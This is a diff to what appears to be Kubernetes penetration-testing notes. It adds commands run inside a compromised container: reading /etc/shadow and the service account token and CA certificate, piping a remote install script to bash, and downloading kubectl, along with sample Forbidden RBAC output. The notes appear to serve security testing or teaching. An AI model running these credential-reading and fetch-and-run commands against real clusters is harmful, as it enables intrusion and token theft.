@@ -48,8 +48,15 @@ Exec into the container
 
 And things to do inside the container 👾
 
-    id && uname -a && pwd && env
+    id
+    uname -a
+    pwd
+    env
     cat /etc/shadow
+    ls /var/run/secrets/kubernetes.io/serviceaccount
+    cat /var/run/secrets/kubernetes.io/serviceaccount/token
+    cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+    cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 
 Checks Unix system for simple privilege escalations - Cron 👾
 
@@ -65,9 +72,27 @@ Inspect Container 👾
 
     cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained
 
-Installing KubeScape 👾
+Installing KubeScape 👾 (this by itself does not get us far as we need to have context)
+So to make it work we need configured `~/.kube/config` or `in-cluster configuration via ServiceAccount
 
     curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash
+
+We could however still try to download `kubectl` 🎅
+
+    export PATH=/tmp:$PATH
+    cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl
+
+And see if we got anything .. which most likely gets you this:
+
+```
+# kubectl get all
+Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:open:default" cannot list resource "pods" in API group "" in the namespace "open"
+Error from server (Forbidden): replicationcontrollers is forbidden: User "system:serviceaccount:open:default" cannot list resource "replicationcontrollers" in API group "" in the namespace "open"
+Error from server (Forbidden): services is forbidden: User "system:serviceaccount:open:default" cannot list resource "services" in API group "" in the namespace "open"
+Error from server (Forbidden): daemonsets.apps is forbidden: User "system:serviceaccount:open:default" cannot list resource "daemonsets" in API group "apps" in the namespace "open"
+Error from server (Forbidden): deployments.apps is forbidden: User "system:serviceaccount:open:default" cannot list resource "deployments" in API group "apps" in the namespace "open"
+```
+
 
 ## More Than One Cluster?
 See all existting clusters
